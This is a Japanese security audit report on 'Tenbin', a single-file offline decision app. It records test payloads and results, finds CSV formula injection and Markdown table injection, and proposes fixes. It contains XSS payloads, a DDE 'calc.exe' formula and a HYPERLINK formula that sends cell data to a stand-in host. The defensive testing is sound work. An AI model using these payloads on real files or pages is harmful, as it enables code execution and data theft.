# 天秤 — セキュリティ審査

- **審査対象**: `C:/Users/kikus/Documents/workspace/paradise-creations/tenbin/index.html` (3085行) / `tests/tenbin.test.js` (1468行)
- **審査日**: 2026-09-01
- **審査方法**: 静的全探索(grep)+ **実機再現**(Node による実コア抽出攻撃 / headless Chrome での DOM 実測)
- **index.html は一切変更していない。** 検証用コピーは `%LOCALAPPDATA%/Temp/secrev` に作成し、審査後に削除。

---

## 1. 脅威モデル(何がリスクで、何が適用外か)

### 前提となる配置
サーバなし・認証なし・単一 HTML を `file://` で開く。データは `localStorage` のみ。ネットワーク送信ゼロを設計目標(AC-25)としている。

### 適用外(このアプリでは成立しない古典的脆弱性

| 脆弱性 | 適用外の理由 |
|---|---|
| SQL/NoSQL インジェクション | DB が存在しない |
| 認証・認可の不備 | 認証機構そのものが無い。データは端末所有者のもののみ |
| CSRF | 状態変更を行うサーバ側エンドポイントが無い |
| セッション固定 / Cookie 窃取 | Cookie もセッションも使用していない |
| 中間者攻撃 (MitM) | 送信が無い。`file://` で完結 |
| サーバ側 SSRF / パストラバーサル | サーバコードが存在しない |
| 依存パッケージの脆弱性 | 外部依存ゼロ(`<script src=` 0件、`@import` 0件) |

### **実在するリスク(本審査が扱う範囲)**
1. **XSS / DOM インジェクション** — 基準名・選択肢名はユーザ入力。`innerHTML` 経由で描画されれば同一オリジンでスクリプト実行。`file://` の場合は特に危険(ローカルファイル読み取りに繋がりうる)
2. **プロトタイプ汚染** — `localStorage` は同一オリジンの他ページや DevTools から書き換え可能。壊れた/悪意ある JSON が `validateState`/`migrateState` に流れる
3. **DoS / リソース枯渇** — 巨大入力・`history` の無限増殖・`localStorage` 容量超過でアプリが機能停止する
4. **情報漏えい** — 「どこにも送信していません」という**製品の中心的な約束**が破られていないか
5. **コード実行経路** — `eval` / `new Function` / 文字列 `setTimeout` / `innerHTML` への変数流し込み
6. **エクスポート経由の二次被害** — CSV を Excel が数式として解釈する(CSV インジェクション)。Markdown の表構造破壊

### 攻撃者モデル
- **A**: アプリを使う本人が悪意ある文字列を入力する(自分自身しか害さないが、**エクスポートを他者に渡す**と伝播する)
- **B**: 同一オリジンの別ページ / 拡張機能 / 共有端末の第三者が `localStorage` を書き換える
- **C**: 他人から受け取った `tenbin.json` を読み込ませる ※現時点でインポート UI は未実装のため理論上のみ

---

## 2. 検査項目と結果

実行環境: Node v24.14.0 / Chrome headless=new。**コアは `index.html` から実物を切り出して評価**(テストと同じ `/*===TENBIN-CORE-BEGIN===*/` マーカ方式)。

### 2-1. プロトタイプ汚染(`validateState` / `migrateState`)

| # | ペイロード | **実行出力** | 判定 |
|---|---|---|---|
| 1 | `{"__proto__":{"polluted":true},...}` | `probe(polluted)=undefined result=ok` | 安全 |
| 2 | `{"constructor":{"prototype":{"pwned":true}},...}` | `probe(pwned)=undefined result=ok` | 安全 |
| 3 | `criteria[0].__proto__ = {cpol:true}` | `probe(cpol)=undefined result=repaired` | 安全 |
| 4 | `options[0].scores.__proto__ = {spol:true}` | `probe(spol)=undefined result=repaired` | 安全 |
| 5 | `settings.__proto__ = {setpol:true}` | `probe(setpol)=undefined result=ok` | 安全 |
| 6 | `initialWeights.__proto__ = {iwpol:true}` | `probe(iwpol)=undefined result=repaired` | 安全 |
| 7 | `history[0].__proto__ = {hpol:true}` | `probe(hpol)=undefined result=ok` | 安全 |
| 8 | `{"prototype":{"ppol":true},...}` | `probe(ppol)=undefined result=ok` | 安全 |
| 9 | `settings.theta.__proto__` (深いネスト) | `probe(dpol)=undefined result=repaired` | 安全 |
| 10 | 返り値の prototype 検査 | `value.polluted=undefined`, `getPrototypeOf(value)===Object.prototype` | 安全 |

**攻撃者制御の id をオブジェクトキーに使う経路**(最も危険な経路 — `scores[cid]` / `initialWeights[cid]` / `critIdSeen[id]`):

| id | **実行出力** | 判定 |
|---|---|---|
| `"__proto__"` | `scoresキー=[c2] proto=clean analyze.ok=false rank=0` | 安全(キー自体が落ちる) |
| `"constructor"` | `scoresキー=[constructor,c2] proto=clean analyze.ok=true rank=2` | 安全 |
| `"prototype"` | `scoresキー=[prototype,c2] proto=clean analyze.ok=true rank=2` | 安全 |
| `"toString"` | `scoresキー=[toString,c2] proto=clean analyze.ok=true rank=2` | 安全 |
| `"hasOwnProperty"` | `scoresキー=[hasOwnProperty,c2] proto=clean analyze.ok=true rank=2` | 安全 |
| `"valueOf"` | `scoresキー=[valueOf,c2] proto=clean analyze.ok=true rank=2` | 安全 |

> **なぜ安全か**: `validateState` はソースを走査せず、**常に `{}` を新規生成して既知フィールドだけをコピーする(allowlist 方式)**。すべての存在検査が `Object.prototype.hasOwnProperty.call(...)` を経由しており(index.html L1371, L1415, L1426, L1434-1435, L1457)、`obj.hasOwnProperty` の直接呼び出しが無い。`__proto__` が id の場合、`scores.__proto__ = 8` の代入は setter に吸収され自身のキーにならないため、後段の `hasOwnProperty` 検査で落ちる。

**グローバル汚染の最終確認**: `Object.prototype` 全プローブ `undefined` / `Array.prototype` 汚染なし / `TenbinCore` は `Object.freeze` 済みで `analyze` の上書き不能。

### 2-2. `analyze` の例外安全性(汚染入力)

| 入力 | **実行出力** | 判定 |
|---|---|---|
| `null` / `undefined` / `42` / `"x"` / `[1,2,3]` / `{}` | いずれも `ok=false degenerate=no-criteria`(例外なし) | 安全 |
| `__proto__` 汚染オブジェクト | `ok=false degenerate=no-criteria` | 安全 |
| 循環参照 (`o.self = o`) | `ok=false degenerate=no-criteria` | 安全 |
| `rawWeight:Infinity`, `scores:NaN` | `ok=false degenerate=one-option` | 安全 |

### 2-3. DoS / リソース枯渇

| ペイロード | **実行出力** | 判定 |
|---|---|---|
| 長さ9999の名前 | `0ms name長=200`(`MAX_NAME=200` でクランプ) | 安全 |
| `criteria` 10000要素 | `1ms 残存=10`(`MAX_ITEMS=10`) | 安全 |
| `options` 10000要素 | `2ms 残存=10` | 安全 |
| `history` 100000要素 | `10ms 残存=500`(`MAX_HISTORY=500`) | 安全 |
| `scores` に10000キー | `4ms scoresキー数=1`(未知キーは破棄) | 安全 |
| 深い入れ子1000段を `settings` に | `0ms settings={"theta":0.1,"flipThreshold":3,"challengerId":null}` | 安全 |
| 10×10 満載 `analyze` | `1ms ok=true ranking=10` | 安全 |

> `history` の無限増殖は `validateState` の切り詰め(L1507-1510)と、書き込み側 `recordWeightEdit` の両方で抑止されている。全ケース 10ms 未満でハングなし。

### 2-4. XSS(headless Chrome 実測)

`localStorage["tenbin.v1.state"]` に以下を**基準名・選択肢名・履歴名**として注入し、実際にアプリを起動:

| ペイロード |
|---|
| `<img src=x onerror="window.__FIRED.push('img-onerror')">` |
| `</script><script>window.__FIRED.push("script-break")</script>` |
| `"><svg onload="window.__FIRED.push('svg-onload')">` |
| `<iframe srcdoc="&lt;script&gt;parent.__FIRED.push('iframe')&lt;/script&gt;"></iframe>` |

**実行出力**(ブラウザ内で観測):
```
seeded (state 注入バイト数) : 1180
fired  (XSS 発火リスト)     : []      <<< 発火ゼロ
net    (ネットワーク送信)   : []      <<< 送信ゼロ
live <img onerror> ノード   : 0
live <svg onload> ノード    : 0
live <iframe> ノード        : 0
script タグ総数             : 6       (元4 + 検証用2 = 期待値どおり)
インラインハンドラ付ノード  : 0
ペイロードがテキストとして  : true    <<< エスケープされ文字列表示=正しい
Object.prototype 汚染       : false
外部リソース参照            : []
```
静的裏付け(検証スクリプトを除去したアプリ描画 DOM 48834 bytes):
```
<img onerror>       : 0
<svg onload>        : 0
<iframe>            : 0
エスケープ済 &lt;img : 33   (>0 = テキスト化されている)
エスケープ済 &lt;/script : 50
外部 http(s) 参照   : 0
```
**視覚的裏付け**: headless スクリーンショットで、1位カードに `<img src=x onerror="window.__FIRED.push('img-onerror')">` が**そのまま文字列として表示**され、結論文・順位・入力欄すべてで同様。画像アイコンもレイアウト崩れも発生していない。

**判定: 安全。XSS は発火しない。**

> **偽陽性の記録(重要)**: 初回の検証ハーネスでは、ペイロードを JS 文字列リテラルとして `<script>` に埋めたため `</script>` が**ハーネス自身**を破壊し、生の `<img onerror>` が5件検出された。これはアプリの欠陥ではなく検証コードの欠陥。ペイロードを **base64 で運搬**する方式に改め(`script` タグ数が期待値 +2 に一致することを検証)、再測定して発火ゼロを確定した。**この偽陽性を欠陥として報告しない。**

### 2-5. エクスポート経由のインジェクション

| 項目 | ペイロード | **実行出力** | 判定 |
|---|---|---|---|
| CSV 数式 | `=cmd\|'/c calc.exe'!A0` | `"=cmd\|'/c calc.exe'!A0"` — 先頭 `=` がそのまま | **欠陥 F-1** |
| CSV 数式 | `=HYPERLINK("http://evil.example/?d="&A1,"click")` | `"=HYPERLINK(""http://evil.example/?d=""&A1,""click"")"` | **欠陥 F-1** |
| CSV 数式 | `+1+1` / `@SUM(1+1)*cmd` | 先頭 `+` `@` がそのまま | **欠陥 F-1** |
| CSV 構造 | `"` を含む名前 | `"` → `""` に正しくエスケープ。列破壊なし | 安全 |
| MD 表構造 | `正常 \| 999 \| 偽装スコア` | `\| 1 \| 正常 \| 999 \| 偽装スコア \| 63.3 \|` (パイプ6本 / 正常は4本) | **欠陥 F-2** |
| MD 文書構造 | `\n\n## 偽の見出し\n` | 改行3個が行を分断 | **欠陥 F-2** |
| MD スクリプト | `<script>alert(1)</script>` | パイプ0 改行0。MD→HTML 変換側の責務 | 参考 |
| JSON | 機微情報の混入 | 外部URL/トークン等: **なし**。ユーザ入力のみ | 安全 |

### 2-6. コード実行経路の全列挙

| シンク | index.html | 備考 |
|---|---|---|
| `eval(` | **0件** | — |
| `new Function` | **0件** | 本体には無い(テスト側のみ。後述 3-F3) |
| `setTimeout("文字列")` | **0件** | `setTimeout` は3箇所すべて**関数参照**を渡している |
| `setInterval("文字列")` | **0件** | — |
| `innerHTML` / `outerHTML` | **0件** | — |
| `insertAdjacentHTML` | **0件** | — |
| `document.write` | **0件** | — |
| `DOMParser` / `createContextualFragment` | **0件** | — |
| `srcdoc` / `javascript:` / `data:text/html` | **0件** | — |

**描画に使われている API**(すべて安全側): `textContent` 37箇所 / `createElement` 25箇所 / `setAttribute` 34箇所 / `appendChild` 24箇所。中核の `setText()`(L1898-1902)は `String(s)` 化した上で `el.textContent` にのみ代入する。**ユーザ入力が HTML パーサに到達する経路が構造的に存在しない。**

### 2-7. localStorage 汚染耐性 / 復旧ラダー(headless 実測)

壊れた JSON(`{ this is NOT json ]]]`)を仕込み、かつ `setItem` を強制的に `QuotaExceededError` にした状態で起動:

```
log            = ["QUOTA_THROWN_ON:tenbin.v1.state","QUOTA_THROWN_ON:tenbin.v1.state"]
quarantine     = "{ this is NOT json ]]]"          ← 隔離キーに退避されている
stateKeyExists = false                              ← 壊れた state は除去
restoreNote    = "前回のデータを読めなかったため、白紙から始めます。"
saveStatus     = "保存できません"                    ← 正直な通知
pageAlive      = true                               ← クラッシュせず動作継続
```
**判定: 安全。** 壊れたデータは破棄せず `tenbin.v1.quarantine` に退避(法医学的に正しい)、容量超過は捕捉されユーザに正直に通知、UI は生存。`window.onerror` への未捕捉例外の到達は **0件**。

### 2-8. 既存テストスイート

`node tests/tenbin.test.js` → **50 passed, 0 failed, 5 skipped**(SKIP はすべて UI 位相に委譲された項目で、本審査が headless で代替検証済み)。

---

## 3. 検出された欠陥

### F-1 — CSV インジェクション(数式トリガ文字が未緩和)

- **重大度: 中 (Medium)**
- **行番号**: `index.html` L2969-2972 (`csvCell`)、影響範囲 L2973-2996 (`buildCsv`)、L3035-3038(CSV 書き出しボタン)

**該当コード(逐語)**
```js
function csvCell(s) {
  var v = String(s === null || s === undefined ? "" : s);
  return '"' + v.replace(/"/g, '""') + '"';
}
```
`"` の二重化のみ。先頭が `=` `+` `-` `@` `TAB` `CR` のセルに対する緩和が**存在しない**。

**再現手順(実施済み)**
1. 基準名に `=cmd|'/c calc.exe'!A0`、選択肢名に `=HYPERLINK("http://evil.example/?d="&A1,"click")` を入力
2. 「CSV を書き出す」を押す
3. 生成された `tenbin.csv` の実出力:
```csv
"選択肢","順位","総合スコア"
"=HYPERLINK(""http://evil.example/?d=""&A1,""click"")","1","63.3"
"+1+1","2","56.7"

"基準","向き","重み","逆転する重み","Δw","逆転相手"
"=cmd|'/c calc.exe'!A0","高いほど良い","66.7","60.0","-6.7","+1+1"
```
→ 先頭が数式文字のセル **8個**。証拠ファイル: `evidence.csv`

**影響**: 生成された CSV を Excel / LibreOffice / Google Sheets で開いた第三者の環境で、`=HYPERLINK` によるデータ持ち出しや DDE (`=cmd|...`) が発動しうる。**このアプリの「送信ゼロ」の約束は守られるが、書き出したファイルが他者に渡った時点で被害が発生する**(攻撃者モデル A の伝播経路)。単独利用では自分自身しか害さないため「高」ではなく「中」。

**修復提案**
```js
function csvCell(s) {
  var v = String(s === null || s === undefined ? "" : s);
  // CSV インジェクション緩和: 数式として解釈されうる先頭文字を無効化する
  if (/^[=+\-@\t\r]/.test(v)) { v = "'" + v; }
  return '"' + v.replace(/"/g, '""') + '"';
}
```
※ `'` 前置は Excel/Sheets で広く機能する。表示上の見た目を変えたくない場合は、書き出し時に「この CSV には数式に見える文字列が含まれます」と警告する案もあるが、既定は無害化を推奨。

---

### F-2 — Markdown 表構造・文書構造インジェクション

- **重大度: 低 (Low)**
- **行番号**: `index.html` L3018-3020(順位表の行組み立て)、L3026-3030(基準表の行組み立て)

**該当コード**
```js
out.push("| " + vm.ranking[i].rank + " | " + vm.ranking[i].name + " | " + vm.ranking[i].displayScore + " |");
```
`name` を素の文字列連結で表セルに埋めている。`|` と改行のエスケープが無い。

**再現手順(実施済み)**
1. 選択肢名に `正常 | 999 | 偽装スコア` を入力
2. 「Markdown を書き出す」を押す
3. 実出力:
```markdown
| 順位 | 選択肢 | 総合スコア |
|---|---|---|
| 1 | 正常 | 999 | 偽装スコア | 63.3 |
| 2 | B | 56.7 |
```
→ パイプが 6 本(正常な3列なら 4 本)。証拠ファイル: `evidence.md`

**影響**: Markdown レンダラで列がずれ、**攻撃者が任意のスコア値を表示できる**。決断の記録としての完全性が損なわれる(改ざんされた記録を「天秤が出した結論」として提示できてしまう)。スクリプト実行には至らないため「低」。ただし本アプリは*決断の証跡を残すこと*が価値であり、記録の信頼性は中核的関心事である点は指摘しておく。

**修復提案**
```js
function mdCell(s) {
  return String(s === null || s === undefined ? "" : s)
    .replace(/\|/g, "\\|")
    .replace(/[\r\n]+/g, " ");
}
// 使用箇所: out.push("| " + r.rank + " | " + mdCell(r.name) + " | " + r.displayScore + " |");
```

---

### F-3 — テストハーネスの `new Function`(リスク評価)

- **重大度: 情報 (Informational) — 対処不要**
- **行番号**: `tests/tenbin.test.js` L174

```js
const factory = new Function('"use strict";\n' + src + "\nreturn TenbinCore;");
```

**リスク評価**: これは `index.html` からコア領域を切り出して**本物の実装をそのまま**評価するための意図的な設計であり、以下の理由で許容できる。

1. **入力は信頼された自リポジトリのファイルのみ**。ネットワークやユーザ入力を評価しない
2. **評価前に純粋性ガードが走る**(L95-125, L166-169)。`document`, `window`, `localStorage`, `sessionStorage`, `navigator`, `fetch`, `XMLHttpRequest`, `alert`, `Date`, `globalThis`, `Math.random`, `</script` の混入を検出して**評価前に fail** させる。したがってコア領域に副作用のあるコードが紛れ込めば、評価される前にテストが落ちる
3. **出荷物には含まれない**。`index.html` 側の `new Function` は **0件**
4. 代替手段(コアを別ファイルに切り出して `require`)は単一 HTML 制約(AC-24)と矛盾するため、現構成では本方式が妥当

**ただし**: このガードは*ソース文字列の字面*を見るものであり、難読化されたアクセス(例: `self["docu"+"ment"]`)は検出できない。自リポジトリのコードを対象とする限り現実的な脅威ではないが、**テストファイルとコアの両方をレビュー対象に含める運用**は維持すべき。

---

### 欠陥サマリ

| 重大度 | 件数 | 項目 |
|---|---|---|
| 致命的 (Critical) | **0** | — |
| 高 (High) | **0** | — |
| 中 (Medium) | **1** | F-1 CSV インジェクション |
| 低 (Low) | **1** | F-2 Markdown 構造インジェクション |
| 情報 (Info) | **1** | F-3 テストの `new Function`(対処不要) |

---

## 4. ネットワーク送信ゼロの証明

### 4-1. 静的全探索(`index.html` 全 136,097 bytes に対する grep)

| 経路 | 件数 |
|---|---|
| `fetch(` | **0** |
| `XMLHttpRequest` | **0** |
| `navigator.sendBeacon` | **0** |
| `WebSocket` | **0** |
| `EventSource` | **0** |
| `new Image(` | **0** |
| `importScripts` | **0** |
| `serviceWorker` | **0** |
| `navigator.geolocation` | **0** |
| `<form ... action=` | **0** |
| `<script ... src=` | **0** |
| `<link ... href=` | **0** |
| `<img ... src=` | **0** |
| `<iframe` | **0** |
| `@import` | **0** |
| `http://` または `https://` | **0** |
| プロトコル相対 `//host` | **0** |
| `ws://` / `wss://` | **0** |
| `data:text/html` | **0** |
| `srcdoc` | **0** |

**`url(` のみ 2件**ヒットしたが、いずれもネットワークではない:
```
L2960: var url = URL.createObjectURL(blob);
L2967: setTimeout(function () { URL.revokeObjectURL(url); }, 0);
```
`Blob` + `URL.createObjectURL` + `a[download]`(各1件)は、**ブラウザ内でファイルを生成してダウンロードさせるだけ**で、送信は発生しない。エクスポート機能の実装として正しい。

文書内の唯一の `href` は L539 の `<a class="skip" href="#z1">結論へ移動</a> `— ページ内アンカーで外部参照ではない。

### 4-2. headless 実測(ランタイム傍受)

`fetch` / `XMLHttpRequest.prototype.open` / `navigator.sendBeacon` / `WebSocket` / `Image.src` の**全経路にフックを仕掛けた状態**でアプリを起動し、XSS ペイロード入りの state を読み込ませて全描画を通した:

```
net (ネットワーク送信) : []     ← 1件も発生せず
外部リソース参照        : []     ← [src],[href],form[action] を全走査して http/https/ws 参照 0件
```

DOM 実測でも、アプリが描画した領域に外部 `http(s)` 参照は **0件**。

**結論: ネットワーク送信ゼロは静的・動的の両面で証明された。** 製品が UI 上で宣言する「このページのデータは、あなたのブラウザにだけ保存されています。どこにも送信していません。」は**事実である**。

---

## 5. 安全であることを確認した項目(攻撃が発火しなかった理由)

| 攻撃 | 発火せず | 理由 |
|---|---|---|
| `<img src=x onerror=...>` を基準名/選択肢名に | ✅ | 描画が `textContent` のみ。HTML パーサに到達しない(L1898-1902 `setText`) |
| `</script><script>...` によるブレイクアウト | ✅ | 同上。DOM API 経由のためタグ境界の概念が無い |
| `"><svg onload=...>` の属性ブレイクアウト | ✅ | 属性は `setAttribute` で設定。文字列連結による HTML 組み立てが存在しない |
| `<iframe srcdoc=...>` | ✅ | 同上。`srcdoc` は 0件 |
| `javascript:` URL | ✅ | ユーザ入力が `href`/`src` に流れる経路が無い |
| `__proto__` / `constructor.prototype` によるプロトタイプ汚染 | ✅ | allowlist コピー + 全存在検査が `Object.prototype.hasOwnProperty.call` 経由 |
| 攻撃者制御 id (`__proto__` 等) をキーにした汚染 | ✅ | 同上。`__proto__` キーは setter に吸収され `hasOwnProperty` 検査で落ちる |
| 長さ9999の名前 / 10000要素配列 / 100000件履歴 | ✅ | `MAX_NAME=200` / `MAX_ITEMS=10` / `MAX_HISTORY=500` で全てクランプ。最長 10ms |
| 深いネスト(1000段)によるスタック枯渇 | ✅ | 再帰下降パースをせず、既知フィールドのみ浅く読む |
| 循環参照オブジェクト | ✅ | `analyze` が例外を投げず `degenerate` を返す |
| 壊れた JSON の読み込み | ✅ | `try/catch` + `quarantine` 退避 + 白紙起動。UI 生存 |
| `localStorage` 容量超過 | ✅ | `setItem` の例外を捕捉し「保存できません」と正直に通知。クラッシュなし |
| `TenbinCore` API の乗っ取り | ✅ | `Object.freeze` 済み。`analyze` の上書き不能 |
| ネットワーク経由の情報漏えい | ✅ | 送信 API が実装に存在しない(第4章) |
| 外部リソース読み込みによるトラッキング | ✅ | 外部参照 0件。完全自己完結の単一 HTML |
| CSV の `"` による列破壊 | ✅ | `"` → `""` の二重化が正しく実装されている(数式緩和は別問題 = F-1) |
| JSON エクスポートへの機微情報混入 | ✅ | ユーザ入力のみ。トークン/URL/端末識別子の類は含まれない |

---

## 総評

**このアプリのセキュリティ姿勢は非常に良好である。**

XSS・プロトタイプ汚染・DoS・情報漏えい・コード実行という**実在するリスク5分類すべてで、実機再現による攻撃が成立しなかった**。特筆すべきは、これが偶然ではなく設計から導かれている点である:

- **描画層に `innerHTML` が1箇所も無い** — XSS を「入力を検査して防ぐ」のではなく、**危険な API を使わないことで構造的に不可能にしている**。エスケープ漏れという概念自体が発生しない
- **`validateState` が allowlist 方式** — 未知のフィールドを引き継がず、常に新しいオブジェクトを組み立てる。プロトタイプ汚染は入口で消える
- **すべての上限が定数として明示**(`MAX_ITEMS` / `MAX_NAME` / `MAX_HISTORY`)— DoS 耐性が偶発的でなく意図的
- **復旧ラダーが法医学的に正しい** — 壊れたデータを黙って捨てず `quarantine` に退避し、ユーザに何が起きたかを正直に伝える
- **「どこにも送信していません」が実証可能な事実** — 製品の中心的な約束が、静的・動的の両面で証明された

検出した2件の欠陥(F-1 / F-2)は、いずれも**アプリ内部ではなくエクスポートしたファイルが第三者の手に渡ったときに顕在化する二次的リスク**であり、本体の安全性を損なうものではない。修正はどちらも数行で完了する。

**出荷可否の意見: 出荷可(条件付き)。**
致命的・高重大度の欠陥はゼロ。**F-1(CSV インジェクション)は出荷前の修正を推奨する** — 修正コストが数行と極めて低く、Excel で開かれることが CSV 書き出し機能の存在理由そのものであるため。F-2 は次回リリースに回して差し支えない。両者とも `index.html` の局所的な変更で完結し、コア(`TenbinCore`)とテストへの影響は無い。

---

### 審査の再現に使用した検証物

| ファイル | 内容 |
|---|---|
| `attack_core.js` | プロトタイプ汚染9種 / `analyze` 例外安全性9種 / DoS 7種 / XSS 文字列透過 / CSV 判定 → **SAFE=26 VULN=0** |
| `attack_ids.js` | 攻撃者制御 id 6種 / グローバル汚染 / freeze / MD injection / JSON 内容 → **VULN=0** |
| `build_probe2.js` + `xss_probe2.html` | base64 運搬方式の XSS 実機ハーネス(headless) |
| `build_quota.js` + `quota_probe.html` | 壊れた JSON + 容量超過の復旧ラダー実測 |
| `export_attack.js` | `csvCell`/`buildCsv`/`buildMd` を実物から抽出して攻撃 → `evidence.csv` / `evidence.md` |
| `netzero.js` | 送信経路30種の全探索 |
| `xss_render.png` | ペイロードが文字列として表示される視覚的証拠 |

※ 検証物はすべて `%LOCALAPPDATA%/Temp/secrev` に作成し、審査完了後に削除した。`index.html` および `tests/tenbin.test.js` は**一切変更していない**。
